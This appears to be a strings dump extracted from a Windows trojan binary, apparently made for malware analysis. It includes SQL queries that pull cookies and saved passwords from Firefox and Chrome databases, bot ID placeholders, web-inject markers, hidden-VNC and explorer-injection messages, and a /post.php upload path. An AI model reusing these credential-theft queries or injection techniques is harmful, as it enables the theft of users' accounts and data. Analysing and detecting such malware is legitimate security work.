6a660,"select  `host`, `name`, `value`, `path`, `expiry`, `isSecure`, `isHttpOnly`, `sameSite` from `moz_cookies`"
6a750,"select `host_key`, `name`, `encrypted_value`, `path`, `expires_utc`, `is_secure`, `is_httponly` from `cookies`"
68d01,"GetMem64"
68d01,"GetMem64"
68d01,"GetMem64"
68d01,"GetMem64"
68d01,"GetMem64"
68d01,"GetMem64"
68d27,"CmpMem64"
68d10,"LdrGetProcedureAddress"
68d60,"NtFreeVirtualMemory"
68d30,"X64Call"
6a5a8,"/"
68d40,"NtAllocateVirtualMemory"
68d30,"X64Call"
69b00,"6.3"
6802c,"kernel32.dll"
68f80,"transfer-encoding"
68f92,"chunked"
68f60,"HTTP/%d.%d %d OK\n"
68fe2,"Content-Length"
68ff1,"%d"
68fd0,"Transfer-Encoding"
68fe2,"Content-Length"
68ff1,"%d"
69000,"Content-Security-Policy"
69020,"X-Content-Security-Policy"
6903a,"X-Frame-Options"
69050,"X-Permitted-Cross-Domain-Policies"
69080,"Content-Security-Policy-Report-Only"
68f40,"%s %s HTTP/%d.%d\n"
68fa0,"if-modified-since"
68fb2,"te"
68fb5,"accept-encoding"
68fc5,"gzip"
68842,": "
6872e,"\n"
6872e,"\n"
68de0,"NtWriteVirtualMemory"
68d30,"X64Call"
6a550,"Host: %s\n%s=%s\nPath: %s\nExpiry: %u\nIsSecure: %s\nIsHttpOnly: %s\nSameSite: %d\n"
6a59d,"true"
6a5a2,"false"
687b2,"content-type"
69331,"audio/"
69338,"video/"
6933f,"model/"
69346,"image/"
6934d,"application/"
6935a,"json/"
69360,"javascript/"
692e2,"content-length"
68766,"C"
68768,"O"
6875e,"CN"
68770,"critical,CA:TRUE"
68884,"%BOTID%"
6888c,"%BOTNET%"
68895,"%RAND%"
68d30,"X64Call"
6a830,"Inject to explorer success."
69db8,"<unknown>"
692e2,"content-length"
692f1,"upgrade"
692f9,"connection"
69304,"close"
6875e,"CN"
68761,"DNS:"
689e8,"VncStartServer"
689f7,"127.0.0.1"
68a01,"VncStopServer"
68f92,"chunked"
69cf1,"keep-alive"
69304,"close"
692f1,"upgrade"
692f9,"connection"
69ce0,"proxy-connection"
692e2,"content-length"
68f80,"transfer-encoding"
692f1,"upgrade"
6af70,"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
692e2,"content-length"
687b2,"content-type"
69ca0,"multipart/form-data"
69cc0,"application/octet-stream"
692d8,".exe"
692dd,".dll"
692d8,".exe"
6875a,"CN="
6a850,"RtlUserThreadStart"
6a870,"NtCreateUserProcess"
6a884,"NtCreateThread"
6a8a0,"ZwDeviceIoControlFile"
6a8e0,"TranslateMessage"
6807d,"crypt32.dll"
6a900,"CertGetCertificateChain"
6a920,"CertVerifyCertificateChainPolicy"
6af20,"{\"encrypted_key\":\""
6930a,"%x\n"
6872e,"\n"
6930f,"0\n\n"
69320,"content-encoding"
68fc5,"gzip"
689f7,"127.0.0.1"
689f7,"127.0.0.1"
6a7fb,"INVALID FILE"
68d30,"X64Call"
6a7bf,"set_url"
6a7bf,"set_url"
6a7c7,"data_before\n"
6a7d5,"data_inject\n"
6a7f0,"data_end\n"
6a7e3,"data_after\n"
6aa70,"Can't inject to explorer."
6aa36,"LdrLoadDll"
68d30,"X64Call"
6aa50,"CreateRemoteThread"
689f7,"127.0.0.1"
689f7,"127.0.0.1"
68f60,"HTTP/%d.%d %d OK\n"
68f40,"%s %s HTTP/%d.%d\n"
68842,": "
6872e,"\n"
6872e,"\n"
6a7fb,"INVALID FILE"
68f24,"host"
68dff,"https://"
68575,"1.2.5"
68710,"-----BEGIN CERTIFICATE-----\n"
6872e,"\n"
68740,"-----END CERTIFICATE-----"
68575,"1.2.5"
68df5,"/post.php"
68dff,"https://"
68364,"*/*"
68368,"HTTP/1.1"
68375,"POST"
68380,"Connection: close\n"
68d80,"NtProtectVirtualMemory"
68d30,"X64Call"
68cf8,"GetTEB64"
68d01,"GetMem64"
68d01,"GetMem64"
68d01,"GetMem64"
68d01,"GetMem64"
68d01,"GetMem64"
689f7,"127.0.0.1"
68a0f,"OK."
68970,"select `origin_url`, `username_value`, `password_value` FROM logins"
689b4,"Url: "
689ba,"Username: "
689c5,"Password: "
68540,"ZwMapViewOfSection"
68553,"mshtml.dll"
68560,"msi=%x load-image=%x"
684ec,".com"
68790,"application/x-www-form-urlencoded"
687b2,"content-type"
687bf,"Authorization"
687e0,"*BIG_SIZE_OF_POST_DATA*"
68842,": "
68845,"\n"
68150,"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
681a0,"|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\]^_`abcdefghijklmnopq"
68394,"/%s"
68398,"br"
6839b,"hr"
6839e,"tr"
683a1,"td"
683a4,"div"
683a8,"h1"
683ab,"h2"
683ae,"h3"
683b1,"h4"
683b4,"h5"
683b7,"h6"
683ba,"li"
683bd,"script"
683c4,"nbsp;"
683bd,"script"
683a1,"td"
